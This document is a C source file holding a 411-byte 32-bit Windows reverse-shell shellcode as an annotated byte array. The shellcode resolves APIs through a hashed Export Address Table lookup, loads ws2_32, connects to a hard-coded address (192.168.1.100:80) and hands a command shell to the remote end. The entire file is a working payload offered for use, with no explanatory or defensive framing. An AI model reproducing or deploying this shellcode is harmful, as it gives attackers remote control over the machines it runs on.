// Generated on 09/09/14 at 11:20:37

// Description     : 32-Bit Reverse shell using Export Address Table
// TCP Address     : 192.168.1.100:80
// Hash algorithm  : ADD/ROL
// Code size       : 411 bytes

#define API_DATA 0x16  // offset to API/DLL
#define PORT_NBR 0x16F // offset to port number
#define IP_ADDR  0x177 // offset to IP address

/* Size = 411 bytes */

char revbind[] = {
  /******************************************************************************************************/
  /* 0000 */  "\x60"                                      /*  pushad                                    */
  /* 0001 */  "\xEB\x0E"                                  /*  jmp 00000011h                             */
  /* 0003 */  "\x5E"                                      /*  pop esi                                   */
  /* 0004 */  "\x33\xC0"                                  /*  xor eax, eax                              */
  /* 0006 */  "\x99"                                      /*  cdq                                       */
  /* 0007 */  "\xB2\xFE"                                  /*  mov dl, FEh                               */
  /* 0009 */  "\xB6\x00"                                  /*  mov dh, 00h                               */
  /* 000B */  "\x03\xD6"                                  /*  add edx, esi                              */
  /* 000D */  "\xFF\xD2"                                  /*  call edx                                  */
  /* 000F */  "\x61"                                      /*  popad                                     */
  /* 0010 */  "\xC3"                                      /*  ret                                       */
  /******************************************************************************************************/
  /* 0011 */  "\xE8\xED\xFF\xFF\xFF"                      /*  call 00000003h                            */
  /* 0016 */  "\x04\x5E"                                  /*  add al, 5Eh                               */
  /* 0018 */  "\x83\xAF\x7F\xA9\x4E\x17\x53"              /*  sub dword ptr [edi+174EA97Fh], 53h        */
  /* 001F */  "\x2D\x80\x55\xC7\xC9"                      /*  sub eax, C9C75580h                        */
  /* 0024 */  "\x5E"                                      /*  pop esi                                   */
  /* 0025 */  "\xCC"                                      /*  int3                                      */
  /* 0026 */  "\x36\x04\x37"                              /*  add al, 37h                               */
  /* 0029 */  "\x9D"                                      /*  popfd                                     */
  /* 002A */  "\x90"                                      /*  nop                                       */
  /* 002B */  "\x0E"                                      /*  push cs                                   */
  /* 002C */  "\x44"                                      /*  inc esp                                   */
  /* 002D */  "\xBC\x53\x86\x8A\x29"                      /*  mov esp, 298A8653h                        */
  /* 0032 */  "\x5E"                                      /*  pop esi                                   */
  /* 0033 */  "\xB5\x4E"                                  /*  mov ch, 4Eh                               */
  /* 0035 */  "\xFF\x88\x82\x60\x96\x33"                  /*  dec dword ptr [eax+33966082h]             */
  /* 003B */  "\xC0\x99\xAC\x03\xD0\xC1\xC2"              /*  rcr byte ptr [ecx-3E2FFC54h], C2h         */
  /* 0042 */  "\x09\x48\x79"                              /*  or dword ptr [eax+79h], ecx               */
  /* 0045 */  "\xF7\x89\x54\x24\x1C\x61\xC3\x60\x8B\x43"  /*  test dword ptr [ecx+611C2454h], 438B60C3h */
  /* 004F */  "\x3C\x8B"                                  /*  cmp al, 8Bh                               */
  /* 0051 */  "\x4C"                                      /*  dec esp                                   */
  /* 0052 */  "\x18\x78\xE3"                              /*  sbb byte ptr [eax-1Dh], bh                */
  /* 0055 */  "\x31\x8D\x74\x19\x18\x6A"                  /*  xor dword ptr [ebp+6A181974h], ecx        */
  /* 005B */  "\x04\x59"                                  /*  add al, 59h                               */
  /* 005D */  "\xAD"                                      /*  lodsd                                     */
  /* 005E */  "\x03\xC3"                                  /*  add eax, ebx                              */
  /* 0060 */  "\x50"                                      /*  push eax                                  */
  /* 0061 */  "\xE2\xFA"                                  /*  loop 0000005Dh                            */
  /* 0063 */  "\x5F"                                      /*  pop edi                                   */
  /* 0064 */  "\x5A"                                      /*  pop edx                                   */
  /* 0065 */  "\x5E"                                      /*  pop esi                                   */
  /* 0066 */  "\x59"                                      /*  pop ecx                                   */
  /* 0067 */  "\x2B\xCB"                                  /*  sub ecx, ebx                              */
  /* 0069 */  "\x74\x1C"                                  /*  je 00000087h                              */
  /* 006B */  "\x8B\x44\x8A\xFC"                          /*  mov eax, dword ptr [edx+ecx*4-04h]        */
  /* 006F */  "\x03\xC3"                                  /*  add eax, ebx                              */
  /* 0071 */  "\xE8\xC2\xFF\xFF\xFF"                      /*  call 00000038h                            */
  /* 0076 */  "\x3B\x44\x24\x1C"                          /*  cmp eax, dword ptr [esp+1Ch]              */
  /* 007A */  "\xE0\xEF"                                  /*  loopne 0000006Bh                          */
  /* 007C */  "\x75\x09"                                  /*  jne 00000087h                             */
  /* 007E */  "\x93"                                      /*  xchg eax, ebx                             */
  /* 007F */  "\x91"                                      /*  xchg eax, ecx                             */
  /* 0080 */  "\x0F\xB7\x04\x47"                          /*  movzx eax, word ptr [edi+eax*2]           */
  /* 0084 */  "\x03\x0C\x86"                              /*  add ecx, dword ptr [esi+eax*4]            */
  /* 0087 */  "\x89\x4C\x24\x1C"                          /*  mov dword ptr [esp+1Ch], ecx              */
  /* 008B */  "\x61"                                      /*  popad                                     */
  /* 008C */  "\xC3"                                      /*  ret                                       */
  /******************************************************************************************************/
  /* 008D */  "\x60"                                      /*  pushad                                    */
  /* 008E */  "\x6A\x30"                                  /*  push 00000030h                            */
  /* 0090 */  "\x59"                                      /*  pop ecx                                   */
  /* 0091 */  "\x64\x8B\x01"                              /*  mov eax, dword ptr fs:[ecx]               */
  /* 0094 */  "\x8B\x40\x0C"                              /*  mov eax, dword ptr [eax+0Ch]              */
  /* 0097 */  "\x8B\x78\x1C"                              /*  mov edi, dword ptr [eax+1Ch]              */
  /* 009A */  "\xEB\x0F"                                  /*  jmp 000000ABh                             */
  /* 009C */  "\x8B\x44\x24\x1C"                          /*  mov eax, dword ptr [esp+1Ch]              */
  /* 00A0 */  "\xE8\xA7\xFF\xFF\xFF"                      /*  call 0000004Ch                            */
  /* 00A5 */  "\x85\xC0"                                  /*  test eax, eax                             */
  /* 00A7 */  "\x75\x09"                                  /*  jne 000000B2h                             */
  /* 00A9 */  "\x8B\x3F"                                  /*  mov edi, dword ptr [edi]                  */
  /* 00AB */  "\x8B\x5F\x08"                              /*  mov ebx, dword ptr [edi+08h]              */
  /* 00AE */  "\x85\xDB"                                  /*  test ebx, ebx                             */
  /* 00B0 */  "\x75\xEA"                                  /*  jne 0000009Ch                             */
  /* 00B2 */  "\x89\x44\x24\x1C"                          /*  mov dword ptr [esp+1Ch], eax              */
  /* 00B6 */  "\x61"                                      /*  popad                                     */
  /* 00B7 */  "\xC3"                                      /*  ret                                       */
  /******************************************************************************************************/
  /* 00B8 */  "\x33\xC0"                                  /*  xor eax, eax                              */
  /* 00BA */  "\xAC"                                      /*  lodsb                                     */
  /* 00BB */  "\x91"                                      /*  xchg eax, ecx                             */
  /* 00BC */  "\xAD"                                      /*  lodsd                                     */
  /* 00BD */  "\xE8\xCB\xFF\xFF\xFF"                      /*  call 0000008Dh                            */
  /* 00C2 */  "\x85\xC0"                                  /*  test eax, eax                             */
  /* 00C4 */  "\x74\x03"                                  /*  je 000000C9h                              */
  /* 00C6 */  "\xAB"                                      /*  stosd                                     */
  /* 00C7 */  "\xE2\xF3"                                  /*  loop 000000BCh                            */
  /* 00C9 */  "\xC3"                                      /*  ret                                       */
  /******************************************************************************************************/
  /* 00CA */  "\x60"                                      /*  pushad                                    */
  /* 00CB */  "\x99"                                      /*  cdq                                       */
  /* 00CC */  "\x8D\x7B\x20"                              /*  lea edi, dword ptr [ebx+20h]              */
  /* 00CF */  "\x8B\xF7"                                  /*  mov esi, edi                              */
  /* 00D1 */  "\x6A\x44"                                  /*  push 00000044h                            */
  /* 00D3 */  "\x8F\x07"                                  /*  pop dword ptr [edi]                       */
  /* 00D5 */  "\xFF\x47\x2D"                              /*  inc dword ptr [edi+2Dh]                   */
  /* 00D8 */  "\x8D\x7F\x38"                              /*  lea edi, dword ptr [edi+38h]              */
  /* 00DB */  "\xAB"                                      /*  stosd                                     */
  /* 00DC */  "\xAB"                                      /*  stosd                                     */
  /* 00DD */  "\xAB"                                      /*  stosd                                     */
  /* 00DE */  "\x95"                                      /*  xchg eax, ebp                             */
  /* 00DF */  "\x8B\xFB"                                  /*  mov edi, ebx                              */
  /* 00E1 */  "\xB8\x9C\x92\x9B\xFF"                      /*  mov eax, FF9B929Ch                        */
  /* 00E6 */  "\xF7\xD0"                                  /*  not eax                                   */
  /* 00E8 */  "\xAB"                                      /*  stosd                                     */
  /* 00E9 */  "\x56"                                      /*  push esi                                  */
  /* 00EA */  "\x56"                                      /*  push esi                                  */
  /* 00EB */  "\x52"                                      /*  push edx                                  */
  /* 00EC */  "\x52"                                      /*  push edx                                  */
  /* 00ED */  "\x68\xFF\xFF\xFF\xF7"                      /*  push F7FFFFFFh                            */
  /* 00F2 */  "\xF7\x14\x24"                              /*  not dword ptr [esp]                       */
  /* 00F5 */  "\x57"                                      /*  push edi                                  */
  /* 00F6 */  "\x52"                                      /*  push edx                                  */
  /* 00F7 */  "\x52"                                      /*  push edx                                  */
  /* 00F8 */  "\x53"                                      /*  push ebx                                  */
  /* 00F9 */  "\x52"                                      /*  push edx                                  */
  /* 00FA */  "\xFF\x53\xE4"                              /*  call dword ptr [ebx-1Ch]                  */
  /* 00FD */  "\xF7\xD8"                                  /*  neg eax                                   */
  /* 00FF */  "\x79\x11"                                  /*  jns 00000112h                             */
  /* 0101 */  "\x50"                                      /*  push eax                                  */
  /* 0102 */  "\xFF\x73\x20"                              /*  push dword ptr [ebx+20h]                  */
  /* 0105 */  "\xFF\x53\xE8"                              /*  call dword ptr [ebx-18h]                  */
  /* 0108 */  "\xAD"                                      /*  lodsd                                     */
  /* 0109 */  "\x50"                                      /*  push eax                                  */
  /* 010A */  "\xFF\x53\xEC"                              /*  call dword ptr [ebx-14h]                  */
  /* 010D */  "\xAD"                                      /*  lodsd                                     */
  /* 010E */  "\x50"                                      /*  push eax                                  */
  /* 010F */  "\xFF\x53\xEC"                              /*  call dword ptr [ebx-14h]                  */
  /* 0112 */  "\x61"                                      /*  popad                                     */
  /* 0113 */  "\xC3"                                      /*  ret                                       */
  /******************************************************************************************************/
  /* 0114 */  "\xB9\x74\xFF\xFF\xFF"                      /*  mov ecx, FFFFFF74h                        */
  /* 0119 */  "\xF7\xD9"                                  /*  neg ecx                                   */
  /* 011B */  "\x2B\xE1"                                  /*  sub esp, ecx                              */
  /* 011D */  "\x8B\xFC"                                  /*  mov edi, esp                              */
  /* 011F */  "\xF3\xAA"                                  /*  rep stosb                                 */
  /* 0121 */  "\x8B\xFC"                                  /*  mov edi, esp                              */
  /* 0123 */  "\xE8\x90\xFF\xFF\xFF"                      /*  call 000000B8h                            */
  /* 0128 */  "\x74\x6A"                                  /*  je 00000194h                              */
  /* 012A */  "\x68\xCC\xCD\xFF\xFF"                      /*  push FFFFCDCCh                            */
  /* 012F */  "\xF7\x14\x24"                              /*  not dword ptr [esp]                       */
  /* 0132 */  "\x68\x77\x73\x32\x5F"                      /*  push 5F327377h                            */
  /* 0137 */  "\x8B\xC4"                                  /*  mov eax, esp                              */
  /* 0139 */  "\x50"                                      /*  push eax                                  */
  /* 013A */  "\xFF\x57\xF0"                              /*  call dword ptr [edi-10h]                  */
  /* 013D */  "\x59"                                      /*  pop ecx                                   */
  /* 013E */  "\x59"                                      /*  pop ecx                                   */
  /* 013F */  "\x85\xC0"                                  /*  test eax, eax                             */
  /* 0141 */  "\x74\x51"                                  /*  je 00000194h                              */
  /* 0143 */  "\xE8\x70\xFF\xFF\xFF"                      /*  call 000000B8h                            */
  /* 0148 */  "\x74\x4A"                                  /*  je 00000194h                              */
  /* 014A */  "\x8B\xDF"                                  /*  mov ebx, edi                              */
  /* 014C */  "\x8B\xCC"                                  /*  mov ecx, esp                              */
  /* 014E */  "\x81\xC1\x01\xFE\xFF\xFF"                  /*  add ecx, FFFFFE01h                        */
  /* 0154 */  "\x51"                                      /*  push ecx                                  */
  /* 0155 */  "\x6A\x02"                                  /*  push 00000002h                            */
  /* 0157 */  "\xFF\x53\xF0"                              /*  call dword ptr [ebx-10h]                  */
  /* 015A */  "\x85\xC0"                                  /*  test eax, eax                             */
  /* 015C */  "\x75\x36"                                  /*  jne 00000194h                             */
  /* 015E */  "\x50"                                      /*  push eax                                  */
  /* 015F */  "\x50"                                      /*  push eax                                  */
  /* 0160 */  "\x50"                                      /*  push eax                                  */
  /* 0161 */  "\x50"                                      /*  push eax                                  */
  /* 0162 */  "\x6A\x01"                                  /*  push 00000001h                            */
  /* 0164 */  "\x6A\x02"                                  /*  push 00000002h                            */
  /* 0166 */  "\xFF\x53\xF4"                              /*  call dword ptr [ebx-0Ch]                  */
  /* 0169 */  "\x8B\xE8"                                  /*  mov ebp, eax                              */
  /* 016B */  "\x40"                                      /*  inc eax                                   */
  /* 016C */  "\x74\x26"                                  /*  je 00000194h                              */
  /* 016E */  "\xB8\xFD\xFF\xFF\xAF"                      /*  mov eax, AFFFFFFDh                        */
  /* 0173 */  "\xF7\xD0"                                  /*  not eax                                   */
  /* 0175 */  "\xAB"                                      /*  stosd                                     */
  /* 0176 */  "\xB8\x3F\x57\xFE\x9B"                      /*  mov eax, 9BFE573Fh                        */
  /* 017B */  "\xF7\xD0"                                  /*  not eax                                   */
  /* 017D */  "\xAB"                                      /*  stosd                                     */
  /* 017E */  "\x6A\x10"                                  /*  push 00000010h                            */
  /* 0180 */  "\x53"                                      /*  push ebx                                  */
  /* 0181 */  "\x55"                                      /*  push ebp                                  */
  /* 0182 */  "\xFF\x53\xF8"                              /*  call dword ptr [ebx-08h]                  */
  /* 0185 */  "\x85\xC0"                                  /*  test eax, eax                             */
  /* 0187 */  "\x75\x07"                                  /*  jne 00000190h                             */
  /* 0189 */  "\x8B\xC5"                                  /*  mov eax, ebp                              */
  /* 018B */  "\xE8\x3A\xFF\xFF\xFF"                      /*  call 000000CAh                            */
  /* 0190 */  "\x55"                                      /*  push ebp                                  */
  /* 0191 */  "\xFF\x53\xFC"                              /*  call dword ptr [ebx-04h]                  */
  /* 0194 */  "\x81\xEC\x74\xFF\xFF\xFF"                  /*  sub esp, FFFFFF74h                        */
  /* 019A */  "\xC3"                                      /*  ret                                       */
  /******************************************************************************************************/
};
